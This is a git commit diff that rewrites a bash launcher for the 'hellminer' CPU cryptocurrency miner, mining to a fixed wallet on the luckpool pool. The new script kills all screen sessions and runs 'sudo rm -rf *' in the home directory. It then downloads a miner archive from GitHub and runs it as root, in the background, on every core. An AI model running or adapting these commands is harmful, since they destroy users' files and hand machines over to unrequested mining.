54c727512984fe72379bfbd1d7159afcb540ae4b
yuadiuosdi <89881946+yuadiuosdi@users.noreply.github.com>
2022-03-16 16:32:35 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
-POOL=stratum+tcp://na.luckpool.net:3956#xnsub
-WALLET=RR1gZge8garhA1K789W4KUkvUB2uWpvRQi
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-cd "$(dirname "$0")"
-chmod 777 * && sudo ./hellminer -u $WALLET.$WORKER -p x --cpu 8 $@
+address=RR1gZge8garhA1K789W4KUkvUB2uWpvRQi
+sudo killall screen
+cd ~ && sudo rm -rf * && mkdir hellminer && cd hellminer && wget https://raw.githubusercontent.com/hellcatz/luckpool/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz
+
+core=$(nproc --all)
+ip=$(curl ifconfig.me)
+ip="${ip//./_}"
+chmod +x hellminer
+sudo screen -dmS hell ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u $address.$ip -p x --cpu $core
